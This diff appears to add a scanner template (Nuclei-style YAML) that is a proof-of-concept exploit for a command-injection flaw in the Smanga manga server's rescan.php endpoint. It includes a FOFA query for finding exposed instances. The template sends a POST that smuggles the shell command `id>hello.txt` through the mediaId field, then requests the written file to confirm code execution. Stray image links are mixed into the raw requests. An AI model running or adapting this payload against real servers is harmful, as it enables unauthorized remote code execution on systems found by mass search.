@@ -1,0 +1,56 @@
+id: poc-ktaispkmypx55y4r
+info:
+  name: smanga rescan存在命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ktaispkmypx55y4r'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ktaispkmypx55y4r
+    fofa: body="Smanga"
+http:
+- raw:
+  - 'POST /php/path/rescan.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+
+    Content-Length: 37
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    If-Modified-Since: Wed, 01 Mar 2023 11:24:50 GMT
+
+    If-None-Match: "63ff3602-c6d"
+
+
+    path=/tmp&mediaId=`id>hello.txt`&pathId=1
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547106697-cd992259-340b-49b9-8bd2-cb98eb629253.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /php/path/hello.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547106907-a405392b-2bf5-48bd-a845-3e3290dc2a00.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
